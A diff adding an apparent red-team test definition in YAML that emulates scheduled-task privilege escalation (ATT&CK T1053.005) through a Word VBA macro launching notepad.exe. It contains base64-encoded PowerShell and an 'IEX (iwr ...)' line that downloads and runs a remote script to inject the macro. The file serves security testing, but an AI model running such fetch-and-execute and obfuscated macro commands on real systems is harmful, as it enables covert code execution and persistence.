@@ -1,0 +1,17 @@
+- id: 2d1c8d98-8f7c-5297-92bb-88066ee05dc0
+  name: Soumaia ART Tests - Task Scheduler via VBA
+  description: 'This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
+
+    30 - 40 seconds after this module has run'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1053.005
+    name: 'Scheduled Task/Job: Scheduled Task'
+  platforms:
+    windows:
+      psh:
+        command: "powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBXAG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAFcAbwByAGQAIgA7ACAAaQBmACAAKAAgACQAcAByAG8AYwBlAHMAcwAgAC0AZQBxACAAIgBXAG8AcgBkACIAKQAgAHsAJABwAHIAbwBjAGUAcwBzACAAPQAgACIAdwBpAG4AdwBvAHIAZAAiAH0ACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAGMAZQBzAHMACgAgACAAZQB4AGkAdAAgADAACgB9ACAAYwBhAHQAYwBoACAAewAgAGUAeABpAHQAIAAxACAAfQAKAA==\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA\n}\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \".\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\""
+        cleanup: |-
+          Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
+        payloads:
+        - T1053.005-macrocode.txt
